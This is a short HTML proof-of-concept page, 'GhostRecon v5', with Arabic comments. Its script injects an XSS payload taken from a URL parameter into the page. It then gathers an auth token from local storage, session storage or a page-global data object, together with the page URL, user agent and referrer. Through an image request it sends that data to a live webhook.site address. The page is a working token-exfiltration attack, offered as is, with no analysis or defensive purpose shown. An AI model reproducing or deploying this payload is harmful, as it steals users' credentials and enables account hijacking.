<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GhostRecon v5 – Auto XSS Token Exfil</title>
</head>
<body>
  <h2>GhostRecon v5 – PoC</h2>
  <script>
    (function () {
      const params = new URLSearchParams(location.search);
      const tl = params.get("tl") || "";

      // محاولة تنفيذ تلقائي إذا كانت قيمة tl تحتوي XSS واضح
      try {
        if (/alert|confirm|prompt|script/i.test(tl)) {
          setTimeout(() => {
            const div = document.createElement("div");
            div.innerHTML = decodeURIComponent(tl);
            document.body.appendChild(div);
          }, 50);
        }
      } catch (e) {}

      // استخراج التوكن من مصادر متعددة
      const token =
        localStorage.getItem("authToken") ||
        sessionStorage.getItem("authToken") ||
        (window.WIZ_global_data && JSON.stringify(window.WIZ_global_data).match(/["']?(auth[^"']*)["']?\s*:\s*["']([^"']+)["']/i)?.[2]) ||
        "N/A";

      // تحضير البيانات
      const data = {
        timestamp: new Date().toISOString(),
        page: location.href,
        executed: !!tl,
        token: token,
        userAgent: navigator.userAgent,
        referer: document.referrer
      };

      // إرسال البيانات إلى Webhook باستخدام image (بدون fetch)
      const img = new Image();
      img.src = "https://webhook.site/837af5cd-4719-4b27-81e8-01828dbf96ec?leak=" + encodeURIComponent(JSON.stringify(data));
    })();
  </script>
</body>
</html>
